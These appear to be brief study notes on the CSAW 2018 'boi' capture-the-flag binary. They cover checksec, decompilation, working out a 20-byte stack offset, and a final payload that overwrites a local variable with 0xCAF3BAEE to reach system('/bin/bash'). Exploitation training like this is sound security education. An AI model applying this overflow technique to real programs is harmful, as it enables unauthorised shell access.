- `file boi` -> `checksec --file boi`
  ![[csaw18_boi_nightmare-1.png]]
- decompile
  ![[csaw18_boi_nightmare-2.png]]
- if `v5 = 0xCAF3BAEE` -> run `system(/bin/bash)` -> goal: `v5 = 0xCAF3BAEE`
- `disas main`
  ![[csaw18_boi_nightmare-3.png]]
- `read(int fd $rdi, void *buf $rsi, int count)` -> `$rsi = $rbp-0x30`
- `v5 = 0xDEADBEEF` -> `v5 = [rbp-0x1c]` -> overwrite `0xCAF3BAEE` at `[rbp-0x1c]`
- buffer = 0x30 - 0x1c = 0x14 = 20
- as read only 24 char -> insert `0xCAF3BAEE` 4 bytes
- `payload = b'A' * 20 + p32(0xCAF3BAEE)`